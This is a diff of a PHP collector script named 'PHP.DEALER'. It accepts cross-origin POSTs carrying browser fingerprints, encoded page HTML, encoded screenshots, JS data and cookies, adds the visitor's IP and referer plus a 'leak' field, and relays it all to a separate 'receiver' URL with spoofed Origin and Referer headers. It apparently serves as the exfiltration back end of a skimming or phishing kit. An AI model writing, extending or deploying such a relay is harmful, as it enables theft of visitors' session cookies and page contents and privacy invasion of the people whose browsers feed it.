@@ -1,12 +1,11 @@
 <?php 
     header("Access-Control-Allow-Origin: *");   
     $DEALER_NAME="PHP.DEALER"; //DEALER_NAME
-    $URI_REZ="http://5ELG_RECIVER_URI"
+    $URI_REZ="http://192.168.1.74/dealer"; //DEALER URL DEAFULT: http://localhost:8888/
 
     function getUserIP() {
         $ip = null;
-    
-        
+
         if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
             $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
         } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
@@ -25,12 +24,11 @@
     
     // Uso
     $IP = getUserIP();
-        
+    $MODE = "SENDER"; // SENDER | WRITER      
     $user_agent=$_SERVER['HTTP_USER_AGENT'];
-
     $UA = str_replace('"', '', $user_agent);
-
     //$UA=$_REQUEST['ua'];
+    
     // Obtener los parámetros del request
     $fpUser = isset($_POST['u']) ? $_POST['u'] : '';
     $fpBrowser = isset($_POST['b']) ? $_POST['b'] : '';
@@ -38,7 +36,10 @@
     $jsData = isset($_POST['data']) ? $_POST['data'] : '';
     $encodedPage = isset($_POST['code']) ? $_POST['code'] : '';
     $encodedScr = isset($_POST['s']) ? $_POST['s'] : '';
-    $TS=time();
+    // Initialize $datetime
+    $datetime = new DateTime(); // Create a DateTime object with the current time
+    $TS = $datetime->format('Y-m-d\TH:i:s.v\Z'); // Format as ISO 8601 with milliseconds
+
 
     $encoded_data=$_SERVER;
     $encoded_req=json_encode($_REQUEST);
@@ -60,6 +61,7 @@
         'dealer_uri' => $origin,
         'merca_uri' => $referer,
         'cookies' => $cookies,
+        'leak' => "LEAK-DATA",
         'requestURL' => $_SERVER['REQUEST_URI'],
         'method' => $_SERVER['REQUEST_METHOD']
     ];
@@ -67,22 +69,22 @@
 
     $data = [
         "DEALER_NAME" => $DEALER_NAME,
-        "IP" => $IP,
+        "ip" => $IP,
         "UA" => urlencode($UA),
-        "FP_USER" => $fpUser,
-        "FP_BROWSER" => $fpBrowser,
-        "FP_REQUEST" => $fpRequest,
-        "HTML_ENCODED" => $encodedPage,
-        "SCREEN_ENCODED" => $encodedScr,
-        "JS_DATA" => $jsData,
-        "encoded_data" => $encoded_data,
-        "encoded_req" => base64_encode($requestData)
+        "u" => $fpUser,
+        "b" => $fpBrowser,
+        "ts" => $TS,
+        "r" => $fpRequest,
+        "code" => $encodedPage,
+        "s" => $encodedScr,
+        "data" => $jsData,
+        "encoded_req" => $requestData
     ];
 
     if ($MODE == "SENDER") {
             $options = array(
                 'http' => array(
-                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+                    'header'  => "Origin: 5ELG-".$DEALER_NAME."\r\nReferer: ".$DEALER_NAME."\r\nUser-Agent: ".$UA."\r\nContent-type: application/x-www-form-urlencoded\r\n",
                     'method'  => 'POST',
                     'content' => http_build_query($data)
                 )
